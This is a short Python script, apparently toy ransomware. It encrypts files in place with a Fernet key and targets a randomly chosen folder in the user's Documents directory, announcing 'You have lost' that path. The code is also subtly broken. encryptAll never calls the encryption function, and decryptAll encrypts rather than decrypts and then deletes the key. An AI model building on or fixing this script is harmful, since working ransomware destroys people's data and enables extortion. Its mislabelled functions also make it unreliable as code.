from cryptography.fernet import Fernet
import os
from pathlib import Path
import random
# Generate a key
key = Fernet.generate_key()

# Save the key into a file
with open('filekey.key', 'wb') as f:
    f.write(key)


# Load the key from the .key file
with open('filekey.key', 'rb') as f:
    key = f.read()

# Create a Fernet object using the key
fernet = Fernet(key)

def encrypt(file):
    # Open the file to be encrypted in binary read mode
    with open(file, 'rb') as f:
        original = f.read()

    # Encrypt the file content
    encrypted = fernet.encrypt(original)

    # Overwrite the original file with the encrypted data
    with open(file, 'wb') as f:
        f.write(encrypted)

def decrypt(file):

    # Load the key again
    with open('filekey.key', 'rb') as f:
        key = f.read()

    # Create a Fernet object
    fernet = Fernet(key)

    # Read the encrypted data from the file
    with open(file, 'rb') as f:
        encrypted = f.read()

    # Decrypt the encrypted data
    decrypted = fernet.decrypt(encrypted)

    # Write the decrypted data back to the file
    with open(file, 'wb') as f:
        f.write(decrypted)




def encryptAll(directory):
    for root, _, files in os.walk(directory):
        for filename in files:  # loop through files in the current directory
            path=os.path.join(root, filename)

def decryptAll(directory):
    for root, _, files in os.walk(directory):
        for filename in files:  # loop through files in the current directory
            path=os.path.join(root, filename)
            encrypt(path)
    os.remove("filekey.key")

DOCUMENTS = Path.home() / 'Documents'
files=os.listdir(DOCUMENTS)
i=random.randint(0,len(files)-1)
path= (str(DOCUMENTS)+"/"+files[i]+"/")
print ("You have lost "+path)
encryptAll(path)
